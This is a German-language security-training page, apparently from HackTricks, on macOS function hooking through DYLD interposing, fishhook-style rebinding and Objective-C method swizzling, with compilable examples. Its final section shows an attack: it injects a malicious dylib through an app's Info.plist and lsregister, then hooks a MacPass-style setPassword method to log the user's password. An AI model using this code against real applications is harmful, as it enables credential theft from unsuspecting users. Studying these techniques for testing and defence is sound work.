# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

Erstelle eine **dylib** mit einem **`__interpose` (`__DATA___interpose`)**-Abschnitt (oder einem Abschnitt mit dem Flag **`S_INTERPOSING`**), der Tupel aus **function pointers** enthält, die auf die **original**- und die **replacement**-Funktionen verweisen.

Anschließend **inject** die dylib mit **`DYLD_INSERT_LIBRARIES`** (das Interposing muss erfolgen, bevor die Hauptanwendung geladen wird). Offensichtlich gelten die [**restrictions** für die Verwendung von **`DYLD_INSERT_LIBRARIES`** auch hier](macos-library-injection/index.html#check-restrictions).

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> Die Umgebungsvariable **`DYLD_PRINT_INTERPOSING`** kann zum Debuggen von interposing verwendet werden und gibt den interpose-Prozess aus.

Beachte außerdem, dass **interposing zwischen dem Prozess und den geladenen Libraries erfolgt**; mit dem Shared-Library-Cache funktioniert es nicht.

### Dynamic Interposing

Es ist jetzt auch möglich, eine Funktion dynamisch mithilfe der Funktion **`dyld_dynamic_interpose`** zu interposen. Dadurch kann eine Funktion **programmgesteuert zur Laufzeit** interposed werden, anstatt dies nur von Anfang an zu tun.

Es müssen lediglich die **Tupel** aus der **zu ersetzenden Funktion und der Ersatzfunktion** angegeben werden.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Import Table Rebinding (fishhook-style)

Wenn du bereits **Codeausführung innerhalb des Prozesses** hast und eine **importierte C-Funktion** hooken möchtest, ohne das Ziel neu zu starten, ist **symbol rebinding** (bekannt geworden durch **`fishhook`**) ein sehr verbreitetes Primitiv.

Anstatt den Abschnitt **`__interpose`** zu verwenden, durchläuft diese Technik die Mach-O-Metadaten (`__LINKEDIT` -> indirekte Symboltabelle -> `__la_symbol_ptr` / `__nl_symbol_ptr`) und **überschreibt den Import-Slot**, der vom aktuellen Image verwendet wird. Dies ist sehr nützlich, um Funktionen in einem **bereits laufenden** Prozess zu hooken oder mit **`rebind_symbols_image`** nur **ein einzelnes Image** zu hooken.<sup>[2]</sup>

> [!TIP]
> Dies betrifft nur Aufrufe, die tatsächlich über einen **Import-Pointer** laufen. Wenn die Zielfunktion direkt innerhalb desselben Images **aufgerufen wird**, gibt es keinen importierten Slot zum Überschreiben, sodass diese Technik diese Aufrufstelle nicht erfasst.
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
Bei aktuellen macOS-Versionen befinden sich viele Rebinding-Ziele nicht mehr in beschreibbaren **`__DATA`**-Seiten. Rebinders müssen **`__DATA_CONST`** normalerweise vorübergehend beschreibbar machen, bevor sie den Pointer patchen. Außerdem solltest du auf Apple Silicon / **`arm64e`** authentifizierte Pointer und zusätzliche Indirektion in **`__AUTH_CONST.__auth_got`** erwarten. Daher kann ein Rebinder, der nur die klassischen Lazy-/Non-Lazy-Symbol-Pointer-Sections durchsucht, einige Call Sites übersehen.<sup>[3]</sup>

> [!CAUTION]
> Die **`arm64e`**-ABI verwendet für viele Function Pointer **Pointer Authentication (PAC)**. Blinde Pointer-Schreibvorgänge, die auf Intel noch funktioniert haben, können eine Call Site auf Apple Silicon beschädigen. Wenn du einen eigenen Rebinder oder Inline Hooker schreibst, solltest du darauf vorbereitet sein, **`<ptrauth.h>`**-Hilfsfunktionen wie **`ptrauth_sign_unauthenticated`** oder **`ptrauth_auth_and_resign`** zu verwenden, und speziell auf **`arm64e`**-Zielen testen.

Weitere Details zu **`__AUTH`**, **`__AUTH_CONST`** und **`__auth_got`** findest du auf [this page](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md).

## Method Swizzling

In ObjectiveC wird eine Methode beispielsweise so aufgerufen: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Benötigt werden das **Objekt**, die **Methode** und die **Parameter**. Wenn eine Methode aufgerufen wird, wird eine **msg gesendet**, wobei die Funktion **`objc_msgSend`** verwendet wird: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Das Objekt ist **`someObject`**, die Methode ist **`@selector(method1p1:p2:)`** und die Argumente sind **value1**, **value2**.

Anhand der Objektstrukturen ist es möglich, ein **Array von Methoden** zu erreichen, in dem die **Namen** und **Pointer** auf den Methodencode **gespeichert** sind.

> [!CAUTION]
> Beachte, dass Methoden und Klassen anhand ihrer Namen angesprochen werden. Diese Informationen sind daher im Binary gespeichert und können mit `otool -ov </path/bin>` oder [`class-dump </path/bin>`](https://github.com/nygard/class-dump) abgerufen werden.

### Zugriff auf die rohen Methoden

Es ist möglich, auf Informationen zu den Methoden zuzugreifen, etwa den Namen, die Anzahl der Parameter oder die Adresse, wie im folgenden Beispiel:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling mit method_exchangeImplementations

Die Funktion **`method_exchangeImplementations`** ermöglicht es, die **Adresse** der **Implementierung** **einer Funktion mit der einer anderen auszutauschen**.

> [!CAUTION]
> Wenn also eine Funktion aufgerufen wird, wird **die jeweils andere ausgeführt**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> In diesem Fall könnte der **Implementierungscode der legitimen** Methode, wenn er den **Namen** der **Methode** **überprüft**, dieses Swizzling erkennen und verhindern, dass es ausgeführt wird.
>
> Die folgende Technik hat diese Einschränkung nicht.

### Method Swizzling mit method_setImplementation

Das vorherige Format ist ungewöhnlich, weil du die Implementierung von 2 Methoden gegenseitig änderst. Mit der Funktion **`method_setImplementation`** kannst du die **Implementierung** einer **Methode durch die der anderen** ändern.

Denke daran, die Adresse der Implementierung der ursprünglichen Methode zu **speichern**, wenn du sie von der neuen Implementierung aus aufrufen möchtest, bevor du sie überschreibst, da es später deutlich komplizierter sein wird, diese Adresse zu finden.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking-Angriffsmethodik

Auf dieser Seite wurden verschiedene Möglichkeiten zum Hooken von Funktionen besprochen. Sie erforderten jedoch das **Ausführen von Code innerhalb des anzugreifenden Prozesses**.

Die einfachste dafür verwendbare Technik besteht darin, einen [Dyld über Umgebungsvariablen oder Hijacking einzuschleusen](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md). Dies könnte jedoch vermutlich auch über [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port) erfolgen.

Beide Optionen sind jedoch auf **ungeschützte** Binärdateien/Prozesse **beschränkt**. Siehe die jeweiligen Techniken, um mehr über die Einschränkungen zu erfahren.

Ein Function-Hooking-Angriff ist jedoch sehr spezifisch: Ein Angreifer führt ihn durch, um **sensible Informationen aus einem Prozess zu stehlen** (andernfalls würde man einfach einen Process-Injection-Angriff durchführen). Diese sensiblen Informationen könnten sich in von Benutzern heruntergeladenen Apps wie MacPass befinden.

Der Angriffsvektor bestünde daher entweder darin, eine Schwachstelle zu finden oder die Signatur der Anwendung zu entfernen, die **`DYLD_INSERT_LIBRARIES`**-Umgebungsvariable über die Info.plist der Anwendung einzuschleusen und etwas wie Folgendes hinzuzufügen:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
und anschließend die Anwendung **erneut registrieren**:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Füge dieser Library den Hooking-Code hinzu, um Informationen zu exfiltrieren: Passwörter, Nachrichten ...

> [!CAUTION]
> Beachte, dass macOS in neueren Versionen die Anwendung nicht mehr ausführt, wenn du die **Signatur** der Anwendungs-Binary **entfernst** und sie zuvor bereits ausgeführt wurde.

#### Library-Beispiel
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Referenzen

- [1] [Method Swizzling - NSHipster](https://nshipster.com/method-swizzling/)
- [2] [facebook/fishhook: A library that simplifies the process of dynamically rebinding symbols in Mach-O binaries](https://github.com/facebook/fishhook)
- [3] [Pointer Authentication — Clang Documentation](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
